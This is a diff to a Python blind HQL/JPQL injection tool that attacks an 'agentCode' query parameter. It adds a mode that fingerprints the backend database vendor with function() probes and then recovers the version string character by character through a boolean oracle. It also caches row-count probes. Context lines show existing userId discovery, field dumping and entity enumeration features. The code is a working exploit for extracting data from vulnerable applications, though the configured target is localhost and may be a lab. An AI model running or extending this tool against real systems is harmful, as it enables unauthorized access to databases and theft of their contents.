@@ -5,13 +5,14 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # =======================
 # CONFIG (edit these)
 # =======================
-URL = "http://localhost:8443/checkvalidagent"  # GET endpoint that accepts ?agentCode=
+URL = "http://127.0.0.1:8443/checkvalidagent"  # GET endpoint that accepts ?agentCode=
 VERIFY_TLS = False
 PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # set None to disable
 HEADERS = {}  # extra headers if needed
 REQUESTS_SENT = 0
 LAST_MSG = ""
 MISSING_FIELDS: set[str] = set()
+COUNT_CACHE: dict[int, bool] = {}
 
 # Phase 1: userId discovery
 TARGET_ENTITY_COUNT = 2
@@ -536,6 +537,144 @@ def discover_and_dump_fields(user_ids: list[str]):
         print(f"{uid} :: {field} = {repr(value)}")
     return results
 
+# ==== BEGIN: DB detection helpers ====
+
+def _probe(expr: str) -> bool :
+    """Return True/False via boolean oracle using your injection mold; None if ambiguous."""
+    return truthy(inj(expr))
+
+def _like(expr: str, pattern: str) -> bool :
+    return _probe(f"{expr} like '{esc(pattern)}'")
+
+def _is_not_null(expr: str) -> bool :
+    return _probe(f"{expr} is not null")
+
+def _len_ge(expr: str, n: int) -> bool :
+    # LENGTH works on strings in all target engines (vendor mapped)
+    return _probe(f"function('length', {expr}) >= {n}")
+
+def _fn_not_found() -> bool:
+    """Heuristic: did the last response indicate an unknown database function?"""
+    msg = (LAST_MSG or "").lower()
+    if not msg:
+        return False
+    return ("function" in msg) and ("does not exist" in msg or "not found" in msg)
+
+def detect_db_vendor_and_version() -> tuple[str , str ]:
+    """
+    Attempts to detect DB vendor and a version string (when available via scalar function).
+    Returns (vendor, version_string_or_None).
+    """
+    probes = [
+        # (vendor, fingerprint_expr, version_expr, version_hint_fn)
+        ("H2",
+         "function('H2VERSION')",
+         "function('H2VERSION')",
+         None),
+
+        ("SQLServer",
+         "function('SERVERPROPERTY','ProductVersion')",
+         "function('SERVERPROPERTY','ProductVersion')",
+         None),
+
+        ("Oracle",
+         "function('SYS_CONTEXT','USERENV','DB_NAME')",   # no FROM needed
+         None,  # no pure-scalar version in WHERE
+         # Optional oracle-hint: presence of ORA_HASH implies >= 11g
+         lambda: ">=11g" if _is_not_null("function('ORA_HASH','x')") else None),
+
+        ("PostgreSQL",
+         "function('current_setting','server_version')",
+         "function('current_setting','server_version')",
+         None),
+
+        ("MySQL/MariaDB",
+         "function('version')",   # present in both
+         "function('version')",
+         None),
+
+        ("HSQLDB",
+         "function('DATABASE_VERSION')",
+         "function('DATABASE_VERSION')",
+         None),
+
+        ("Derby",
+         "function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','derby.versionNumber')",
+         "function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','derby.versionNumber')",
+         None),
+
+        ("SQLite",
+         "function('sqlite_version')",
+         "function('sqlite_version')",
+         None),
+    ]
+
+    vendor = None
+    version = None
+
+    # If we know the entity and the outer table is empty, the boolean oracle in WHERE
+    # cannot flip to true (count(*) stays 0). In that case, treat "no error" on a probe
+    # as a positive vendor signal and skip version extraction.
+    table_empty = None
+    try:
+        if HQL_ENTITY:
+            table_empty = (truthy(inj(exists("1=1"))) is not True)
+    except Exception:
+        table_empty = None
+
+    # Decision ladder
+    for name, fp_expr, ver_expr, hint_fn in probes:
+        ok = _is_not_null(fp_expr)
+        if ok is True:
+            vendor = name
+            # Vendor-specific differentiation for MySQL vs MariaDB
+            if name == "MySQL/MariaDB":
+                maria = _like("function('version')", "%MariaDB%")
+                if maria is True:
+                    vendor = "MariaDB"
+                elif maria is False:
+                    vendor = "MySQL"
+            # Attempt version extraction if we have an expression
+            if ver_expr:
+                # Try to discover length and then dump a few leading chars via boolean probes
+                # First: ensure non-empty
+                if _len_ge(ver_expr, 1) is True:
+                    # Recover up to 20 chars (sufficient for most banners) by binary search on char set
+                    # Simple brute over expected charset "0123456789abcdef.ABCDEF-+_()/ "
+                    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- +()/"
+                    v = ""
+                    for pos in range(1, 21):
+                        advanced = False
+                        for c in charset:
+                            # SUBSTRING is 1-based and named SUBSTRING in most dialects; route via function()
+                            if _probe(f"function('substring',{ver_expr},{pos},1) = '{esc(c)}'") is True:
+                                v += c; advanced = True; break
+                        if not advanced:
+                            # Stop at first non-match; likely end of string
+                            break
+                    version = v or None
+            # Optional Oracle version hint (no FROM)
+            if name == "Oracle" and hint_fn:
+                hint = hint_fn()
+                if hint and not version:
+                    version = hint
+            break
+        else:
+            # If function-not-found is clearly reported, it isn't this vendor.
+            if _fn_not_found():
+                continue
+            # If table is empty and the call did not error (message blank/benign), accept vendor.
+            if table_empty is True and not _fn_not_found():
+                vendor = name
+                # We cannot reliably get a version without rows.
+                version = None
+                break
+
+    return vendor, version
+
+# ==== END: DB detection helpers ====
+
+
 # =======================
 # Main
 # =======================
@@ -552,12 +691,24 @@ def main():
     parser.add_argument("--resolve-entities", action="store_true", help="Probe a wordlist of entity names and print those that are mapped")
     parser.add_argument("--entities", help="Path to a wordlist of entity names (simple or FQN) for --resolve-entities")
     parser.add_argument("--count-rows", action="store_true", help="Print total row count for --entity and exit")
+    parser.add_argument("--detect-db", action="store_true", help="Detect database vendor and version via function() probes")
     args = parser.parse_args()
     DEBUG = args.debug
     HQL_ENTITY = args.entity
     AI_MODE = args.ai_mode
     AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))
     TARGET_ENTITY_COUNT = max(1, int(args.entity_count or 2))
+
+    if args.detect_db:
+        vndr, ver = detect_db_vendor_and_version()
+        if not vndr:
+            print("[detect-db] Unable to fingerprint vendor (oracle ambiguous). Try different endpoint or relax WAF.")
+            return
+        if ver:
+            print(f"[detect-db] vendor={vndr}, version={ver}")
+        else:
+            print(f"[detect-db] vendor={vndr}, version=? (no scalar version in WHERE; try UNION/SELECT-list path)")
+        return
 
     # Resolve-entities mode: enumerate mapped entities from wordlist and exit
     if args.resolve_entities:
@@ -576,7 +727,11 @@ def main():
     # Count-only mode: compute and print total number of rows for the entity and exit
     if args.count_rows:
         def _ge(k: int):
-            return truthy(inj(f"(select count(*) from {HQL_ENTITY} u) >= {k}"))
+            if k in COUNT_CACHE:
+                return COUNT_CACHE[k]
+            res = truthy(inj(f"(select count(*) from {HQL_ENTITY} u) >= {k}"))
+            COUNT_CACHE[k] = res
+            return res
 
         # Quick zero check
         t1 = _ge(1)
